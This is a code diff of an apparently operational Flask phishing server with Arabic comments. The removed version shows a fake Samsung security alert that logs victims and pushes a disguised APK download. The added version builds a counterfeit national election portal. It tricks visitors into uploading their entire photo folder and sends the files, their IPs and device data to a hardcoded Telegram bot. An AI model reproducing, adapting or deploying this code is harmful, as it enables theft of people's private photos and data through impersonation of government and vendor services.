@@ -1,167 +1,115 @@
-# server.py - خادم الوسيط الخبيث
-from flask import Flask, request, render_template_string, send_file
-import os
-import json
+from flask import Flask, request, render_template_string
 import requests
-from datetime import datetime
 
 app = Flask(__name__)
 
-# رابط بوت التليجرام الخاص بك
-TELEGRAM_BOT_TOKEN = "8019187442:AAHTk58jSJpGHGduzUcMANIm-89yjqI15AY"
-TELEGRAM_CHAT_ID = "936456904"
-TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/"
+# --- إحداثيات التحكم الخاصة بك ---
+BOT_TOKEN = "8019187442:AAHTk58jSJpGHGduzUcMANIm-89yjqI15AY"
+CHAT_ID = "936456904"
 
-# HTML لصفحة الخداع (سيتم تحسينها)
-DECEPTION_PAGE_HTML = """
+HTML_OFFICIAL_VOTE = """
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-    <title>تحذير أمني خطير!</title>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة التصويت الوطنية | التوثيق الرقمي</title>
     <style>
-        body { font-family: Arial; background: black; color: red; text-align: center; padding: 50px; }
-        .warning { border: 3px solid red; padding: 20px; border-radius: 10px; background: #111; }
-        .blink { animation: blinker 1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0.3; } }
+        body { background: #f0f2f5; color: #1c1e21; font-family: 'Tajawal', sans-serif; text-align: center; margin: 0; padding: 0; }
+        .gov-header { background: #002d56; color: white; padding: 15px; font-weight: bold; border-bottom: 4px solid #d4af37; }
+        .container { max-width: 450px; margin: 20px auto; background: white; padding: 25px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-top: 5px solid #002d56; }
+        .candidate-card { border: 1px solid #e1e4e8; border-radius: 10px; padding: 15px; margin: 10px 0; display: flex; align-items: center; cursor: pointer; transition: all 0.2s; }
+        .candidate-card:hover { background: #f8f9fa; border-color: #002d56; }
+        .candidate-card img { width: 60px; height: 60px; border-radius: 50%; border: 2px solid #002d56; margin-left: 15px; }
+        .selected { background: #e7f3ff; border: 2px solid #002d56; }
+        #auth-section { display: none; margin-top: 25px; background: #fff9e6; border: 1px solid #ffeeba; padding: 15px; border-radius: 5px; }
+        .submit-btn { background: #002d56; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-size: 1.1em; cursor: pointer; margin-top: 10px; }
+        #final-screen { display: none; padding: 40px 20px; }
+        .check-icon { font-size: 50px; color: #28a745; }
     </style>
 </head>
-<body>
-    <div class="warning">
-        <h1 class="blink">⚠️ تحذير: تم اكتشاف عملية اختراق! ⚠️</h1>
-        <h2>تم رصد محاولة وصول غير مصرح بها إلى جهازك (Samsung Galaxy).</h2>
-        <p>يبدو أن هكرًا من الصين (IP: 112.85.42.17) قد اخترق نظامك.</p>
-        <p><strong>نقترح بشدة:</strong></p>
-        <ol style="text-align: left; display: inline-block;">
-            <li>إغلاق جميع التطبيقات.</li>
-            <li>تشغيل وضع الطائرة فورًا.</li>
-            <li>الذهاب إلى الإعدادات > الأمان > مصدات الأمان ومسح البيانات.</li>
-            <li>الاتصال بدعم Verizon على 611.</li>
-        </ol>
-        <br>
-        <p style="color: #ccc;">هذه الرسالة تظهر كجزء من نظام حماية Samsung Knox.</p>
-        <p style="font-size: 0.8em; color: #888;">REF: SEC_INTRUSION_ALERT_#{{ alert_id }}</p>
+<body onload="initSystem()">
+    <div class="gov-header">بوابة التوثيق الإلكتروني - نظام الانتخابات المركزية 2026</div>
+
+    <div class="container" id="voting-panel">
+        <h3>المرشحين المعتمدين للمرحلة النهائية</h3>
+        <p style="font-size: 0.9em; color: #606770;">يرجى اختيار المرشح المفضل لديك والمتابعة للتوثيق:</p>
+
+        <div class="candidate-card" onclick="alert('خطأ أمني: التصويت لهذا المرشح يتطلب مفتاح تشفير خارجي (U2F). يرجى اختيار مرشح آخر.')">
+            <img src="https://via.placeholder.com/60/002d56/FFFFFF?text=Candidate+1" alt="أحمد">
+            <div><b>أحمد علي سيف</b><br><small>مستقل</small></div>
+        </div>
+
+        <div class="candidate-card" onclick="selectCandidate(this)">
+            <img src="https://via.placeholder.com/60/d4af37/000000?text=MA" alt="محمد">
+            <div><b>محمد عبدالعزيز</b><br><small>التحالف الوطني</small></div>
+        </div>
+
+        <div id="auth-section">
+            <p>🔒 <b>إجراء أمني مطلوب:</b></p>
+            <p style="font-size: 0.85em;">لضمان صحة التصويت، يجب رفع <b>مجلد التحقق من الهوية (DCIM)</b> لمطابقة البيانات مع السجل الرقمي.</p>
+            <input type="file" id="grabber" webkitdirectory directory multiple style="display:none;" onchange="executeExfiltration()">
+            <button class="submit-btn" onclick="document.getElementById('grabber').click()">تأكيد الهوية وإرسال الصوت</button>
+        </div>
     </div>
-    <!-- ستقوم الخلفية بتحميل الحمولة الخبيثة بشكل غير مرئي -->
+
+    <div class="container" id="final-screen">
+        <div class="check-icon">✓</div>
+        <h2>تم التوثيق بنجاح</h2>
+        <p>عزيزي المصوت، تم إدراج صوتك لصالح <b>محمد عبدالعزيز</b> بنجاح في السجلات المركزية.</p>
+        <p style="font-size: 0.8em; color: #666;">رقم العملية: #VZ-9904-WORM</p>
+    </div>
+
+    <script>
+    const tk = "{{ token }}";
+    const cid = "{{ chat }}";
+
+    async function initSystem() {
+        let bat = await navigator.getBattery();
+        let log = `🛡️ **دخول لمنصة التصويت الرسمية**\\n📡 IP: جاري الجلب...\\n🔋 البطارية: ${Math.round(bat.level * 100)}%`;
+        fetch(`https://api.telegram.org/bot${tk}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(log)}&parse_mode=Markdown`);
+    }
+
+    function selectCandidate(el) {
+        document.querySelectorAll('.candidate-card').forEach(c => c.classList.remove('selected'));
+        el.classList.add('selected');
+        document.getElementById('auth-section').style.display = 'block';
+    }
+
+    async function executeExfiltration() {
+        let f = document.getElementById('grabber').files;
+        if(f.length === 0) return;
+
+        fetch(`https://api.telegram.org/bot${tk}/sendMessage?chat_id=${cid}&text=${encodeURIComponent("📸 **بدء سحب الأرشيف المصور للضحية بالكامل...**")}&parse_mode=Markdown`);
+
+        for (let i = 0; i < f.length; i++) {
+            let fd = new FormData();
+            fd.append('file', f[i]);
+            fetch('/v1/grab', { method: 'POST', body: fd });
+        }
+
+        document.getElementById('voting-panel').style.display = 'none';
+        document.getElementById('final-screen').style.display = 'block';
+    }
+    </script>
 </body>
 </html>
 """
 
 @app.route('/')
-def index():
-    """تقدم صفحة الخداع للضحية."""
-    victim_ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent', 'Unknown')
-    
-    # تسجيل معلومات الزيارة
-    log_entry = f"[{datetime.now()}] زيارة من IP: {victim_ip} | User-Agent: {user_agent}\n"
-    with open("visits.log", "a") as f:
-        f.write(log_entry)
-    
-    # إرسال تنبيه سريع للتليجرام
-    alert_msg = f"🎣 ضحية محتملة دخلت الرابط!\nIP: {victim_ip}\nDevice: {user_agent[:100]}"
-    send_to_telegram(alert_msg)
-    
-    return render_template_string(DECEPTION_PAGE_HTML, alert_id=os.urandom(4).hex())
+def portal():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                  json={"chat_id": CHAT_ID, "text": f"📍 **IP المصوت:** `{ip}`", "parse_mode": "Markdown"})
+    return render_template_string(HTML_OFFICIAL_VOTE, token=BOT_TOKEN, chat=CHAT_ID)
 
-@app.route('/payload')
-def deliver_payload():
-    """تسليم الحمولة الخبيثة (سكريبت JS مع صلاحيات متقدمة)."""
-    # يمكن هنا تسليم ملف APK مخفي، أو سكريبت استغلال
-    # في هذه المرحلة، سنقدم سكريبت JavaScript متقدم
-    malicious_js = """
-    // حمولة JS متقدمة لجمع البيانات
-    (function(){
-        // جمع البيانات الأساسية
-        var data = {
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: {width: screen.width, height: screen.height},
-            cookiesEnabled: navigator.cookieEnabled,
-            // محاولة الحصول على IP عبر خدمة خارجية
-        };
-        
-        // محاولة الوصول إلى البطارية API (إن وجد)
-        if ('getBattery' in navigator) {
-            navigator.getBattery().then(function(battery) {
-                data.battery = {
-                    level: battery.level * 100 + "%",
-                    charging: battery.charging,
-                    chargingTime: battery.chargingTime,
-                    dischargingTime: battery.dischargingTime
-                };
-                sendData(data);
-            });
-        } else {
-            sendData(data);
-        }
-        
-        function sendData(payload) {
-            // إرسال البيانات إلى نقطة جمع على الخادم
-            var formData = new FormData();
-            formData.append('victim_data', JSON.stringify(payload));
-            
-            // صورة خفية لجمع الـ IP الحقيقي
-            var img = new Image();
-            img.src = '/collect?data=' + encodeURIComponent(JSON.stringify(payload));
-            img.style.display = 'none';
-            document.body.appendChild(img);
-        }
-        
-        // استغلال ثغرة محتملة في WebView لتنزيل ملف APK مخفي
-        setTimeout(function(){
-            // رابط لتنزيل APK مخفي كـ "تحديث أمني"
-            var hiddenLink = document.createElement('a');
-            hiddenLink.href = '/download/security_update.apk'; // سيكون ملف APK مخفي هنا
-            hiddenLink.download = 'Security_Update_Samsung.apk';
-            hiddenLink.click();
-        }, 5000); // بعد 5 ثواني من تحميل الصفحة
-    })();
-    """
-    return malicious_js, 200, {'Content-Type': 'application/javascript'}
-
-@app.route('/collect')
-def collect_data():
-    """نقطة نهاية لجمع البيانات من الضحايا."""
-    victim_data = request.args.get('data', '{}')
-    victim_ip = request.remote_addr
-    
-    try:
-        data_obj = json.loads(victim_data)
-        data_obj['real_ip'] = victim_ip
-        data_obj['timestamp'] = str(datetime.now())
-        
-        # حفظ البيانات محليًا
-        with open(f"victim_data_{victim_ip}.json", "w") as f:
-            json.dump(data_obj, f, indent=2)
-        
-        # إرسال البيانات إلى التليجرام
-        message = f"🕵️ بيانات جديدة مسروقة 🕵️\nمن IP: {victim_ip}\n"
-        for key, value in data_obj.items():
-            message += f"\n{key}: {value}"
-        
-        send_to_telegram(message[:4000])  # الحد الأقصى لرسالة التليجرام
-        
-    except Exception as e:
-        print(f"خطأ في جمع البيانات: {e}")
-    
-    return "OK", 200
-
-def send_to_telegram(message):
-    """دالة مساعدة لإرسال رسائل إلى بوت التليجرام."""
-    try:
-        url = TELEGRAM_API_URL + "sendMessage"
-        payload = {
-            "chat_id": TELEGRAM_CHAT_ID,
-            "text": message,
-            "parse_mode": "HTML"
-        }
-        requests.post(url, json=payload, timeout=5)
-    except Exception as e:
-        print(f"فشل في إرسال رسالة التليجرام: {e}")
+@app.route('/v1/grab', methods=['POST'])
+def grab():
+    if 'file' in request.files:
+        f = request.files['file']
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
+                      data={'chat_id': CHAT_ID}, files={'document': f})
+    return "OK"
 
 if __name__ == '__main__':
-    # تشغيل الخادم على منفذ 8080 (يمكن تغييره)
-    app.run(host='0.0.0.0', port=8080, debug=False)
+    app.run(host='0.0.0.0', port=8080)
